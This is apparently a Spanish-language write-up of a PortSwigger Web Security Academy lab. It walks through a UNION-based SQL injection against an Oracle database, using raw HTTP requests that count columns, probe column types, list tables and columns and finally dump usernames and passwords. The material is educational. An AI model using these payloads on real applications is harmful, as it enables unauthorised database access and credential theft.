---
description: >-
  https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle
---

# Lab 6: SQL injection attack, listing the database contents on Oracle

Se inicia el laboratorio y al interactuar con los filtros de busqueda:

Se genera la siguiente peticion:

```
GET /filter?category=Lifestyle HTTP/2
Host: 0a76002004acf6bd82c6fb1900d600e1.web-security-academy.net
Cookie: session=4r7p479MteGfJHw186eSSaLBr06RDplw
Sec-Ch-Ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: es-CO
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a76002004acf6bd82c6fb1900d600e1.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

Lo anterior responde asi:

```
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 8917

```

Empezamos a validar el numero de campos con ORDER BY:

```
GET /filter?category='+order+by+1-- HTTP/2
Host: 0a76002004acf6bd82c6fb1900d600e1.web-security-academy.net
Cookie: session=4r7p479MteGfJHw186eSSaLBr06RDplw
Sec-Ch-Ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: es-CO
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a76002004acf6bd82c6fb1900d600e1.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

Lo anterior responde asi:

```
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3862

```

Se procede a incrementar el valor a 2:

```
GET /filter?category='+order+by+2-- HTTP/2
Host: 0a76002004acf6bd82c6fb1900d600e1.web-security-academy.net
Cookie: session=4r7p479MteGfJHw186eSSaLBr06RDplw
Sec-Ch-Ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: es-CO
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a76002004acf6bd82c6fb1900d600e1.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

Lo anterior responde asi:

```
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3862

```

Y finalizamos validando con el numero 3:

```
GET /filter?category='+order+by+3-- HTTP/2
Host: 0a76002004acf6bd82c6fb1900d600e1.web-security-academy.net
Cookie: session=4r7p479MteGfJHw186eSSaLBr06RDplw
Sec-Ch-Ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: es-CO
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a76002004acf6bd82c6fb1900d600e1.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

Pero obtenemos un error:

```
HTTP/2 500 Internal Server Error
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 2391

```

Teniendo en cuenta los resultados previos podemos afimar que podemos utilizar 2 campos para retornar data con las inyecciones.

Se procede a identificar el tipo de campo por cada columna:

```
GET /filter?category='+UNION+SELECT+NULL,NULL+FROM+dual-- HTTP/2
Host: 0a76002004acf6bd82c6fb1900d600e1.web-security-academy.net
Cookie: session=4r7p479MteGfJHw186eSSaLBr06RDplw
Sec-Ch-Ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: es-CO
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a76002004acf6bd82c6fb1900d600e1.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

Retornando nulos todo funciona:

```
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3943

```

Sin embargo, al intentar retornar numeros en cualquiera de los 2 campos se obtiene un error:

```
GET /filter?category='+UNION+SELECT+2,NULL+FROM+dual-- HTTP/2
Host: 0a76002004acf6bd82c6fb1900d600e1.web-security-academy.net
Cookie: session=4r7p479MteGfJHw186eSSaLBr06RDplw
Sec-Ch-Ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: es-CO
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a76002004acf6bd82c6fb1900d600e1.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

o tambien esta peticion:

```
GET /filter?category='+UNION+SELECT+NULL,2+FROM+dual-- HTTP/2
Host: 0a76002004acf6bd82c6fb1900d600e1.web-security-academy.net
Cookie: session=4r7p479MteGfJHw186eSSaLBr06RDplw
Sec-Ch-Ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: es-CO
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a76002004acf6bd82c6fb1900d600e1.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

Ambas peticiones previas responden con un error:

```
HTTP/2 500 Internal Server Error
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 2391

```

Pero al intentar retornar STRING en ambos campos se logra retornar exitosamente:

```
GET /filter?category='+UNION+SELECT+'Spartan','Cybersecurity'+FROM+dual-- HTTP/2
Host: 0a76002004acf6bd82c6fb1900d600e1.web-security-academy.net
Cookie: session=4r7p479MteGfJHw186eSSaLBr06RDplw
Sec-Ch-Ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: es-CO
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a76002004acf6bd82c6fb1900d600e1.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

Lo anterior responde asi:

<figure><img src="../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>

Se procede a retornar los nombres de las tablas:

```
GET /filter?category='+UNION+SELECT+table_name,NULL+FROM+all_tables-- HTTP/2
Host: 0a76002004acf6bd82c6fb1900d600e1.web-security-academy.net
Cookie: session=4r7p479MteGfJHw186eSSaLBr06RDplw
Sec-Ch-Ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: es-CO
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a76002004acf6bd82c6fb1900d600e1.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

La peticion previa retorna lo siguiente:

<figure><img src="../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>

Se procede a revisar las columnas para la tabla de usuarios:

```
GET /filter?category='+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_MPGBNR'-- HTTP/2
Host: 0a76002004acf6bd82c6fb1900d600e1.web-security-academy.net
Cookie: session=4r7p479MteGfJHw186eSSaLBr06RDplw
Sec-Ch-Ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: es-CO
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a76002004acf6bd82c6fb1900d600e1.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

La peticion previa responde asi:

<figure><img src="../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>

Y ahora finalizamos retornando los valores de toda la tabla con la siguiente consulta:

Utilizando los nombres de las columnas y de la tabla se crea el siguiente payload:

```
GET /filter?category='+UNION+SELECT+USERNAME_DDLRLR,+PASSWORD_KSLGEY+FROM+USERS_MPGBNR-- HTTP/2
Host: 0a76002004acf6bd82c6fb1900d600e1.web-security-academy.net
Cookie: session=4r7p479MteGfJHw186eSSaLBr06RDplw
Sec-Ch-Ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: es-CO
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a76002004acf6bd82c6fb1900d600e1.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

Y la respuesta es la siguiente:

<figure><img src="../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
